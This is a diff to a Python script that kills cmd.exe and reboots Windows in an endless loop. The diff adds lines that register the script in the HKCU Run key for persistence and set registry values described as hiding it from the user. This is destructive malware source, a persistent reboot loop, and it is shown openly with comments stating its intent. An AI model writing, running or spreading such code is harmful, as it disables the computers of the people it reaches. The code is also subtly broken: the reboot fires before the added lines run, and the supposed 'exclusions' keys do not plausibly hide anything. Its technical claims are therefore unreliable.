@@ -8,7 +8,13 @@ os.system("taskkill /im cmd.exe")
 
 while True:
     try:
-        # Restart the computer
+         # Restart the computer
         os.system("shutdown /r /t 0")
+
+         # Add itself to startup programs
+        os.system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v python_restarter /t REG_SZ /d %s" % (os.path.abspath(__file__)))
+
+         # Add itself to exclusions list
+        os.system("reg add HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /v ExcludedExtensions /t REG_MULTI_SZ /d '%s' && reg add HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /v ExcludedDevices /t REG_MULTI_SZ /d 'python.exe'" % (os.path.abspath(__file__)))
     except Exception as e:
         print(f"An error occurred: {e}")
